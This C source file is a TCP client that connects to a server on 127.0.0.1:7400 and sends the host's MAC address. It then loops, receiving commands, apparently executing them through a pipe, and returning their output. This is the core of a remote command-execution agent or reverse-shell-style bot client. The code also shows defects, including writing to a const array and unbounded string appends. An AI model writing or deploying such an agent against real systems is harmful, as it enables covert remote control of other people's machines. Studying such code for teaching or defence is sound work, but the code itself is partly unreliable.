#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "../util/util.h"
#include "client_functions.h"
int main() {
  const int MSG_SIZE = 4096;
  const uint16_t MYPORT = 7400;
  const char HOSTNAME[] = "127.0.0.1";
  const char mac_addr[12];

  /* Create a socket for the client */

  int sockfd = open_tcp_socket();

  /* Get server's IP address */
  struct hostent* server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host \n");
  }

  struct sockaddr_in serv_addr = {
      .sin_family = AF_INET,
      .sin_port = (in_port_t)htons(MYPORT),
      .sin_addr = *(struct in_addr*)*server->h_addr_list,
  };

  printf("Trying to connect to %s \n", HOSTNAME);
  try_connect(sockfd, serv_addr);

  printf("Connected to server.\n");
  char msg[MSG_SIZE];
  char output_buffer[MSG_SIZE];  // Adjust buffer size as needed
  char result_buffer[MSG_SIZE];  // Initialize an empty string buffer

  // Send MAC Address Once
  char* wl_interface = find_devices("/sys/class/net");
  if (mac_address(wl_interface, mac_addr) == -1) {
    printf("Failed to get MAC Address");
  }

  printf("SENDING MAC ADDRESS: %s \n ", mac_addr);
  if (send(sockfd, mac_addr, strlen(mac_addr), 0) == -1) {
    error_and_exit("Error sending response to server\n");
  }

  while (1) {
    // Process the received message here (e.g., execute commands)
    FILE* output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
    memset(result_buffer, 0,
           strlen(result_buffer));  // clear result_buffer
    // Read the output of the command and send it back to the server
    while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
      strcat(result_buffer,
             output_buffer);  // Append each line to the result buffer
    }

    printf("%s \n", result_buffer);

    // Send the result buffer back to the server
    if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
      pclose(output_pipe);
      close(sockfd);
      error_and_exit("Error sending response to server\n");
    }

    // Ensure the data is sent immediately
    fflush(stdout);
    pclose(output_pipe);
  }
  return 0;
}
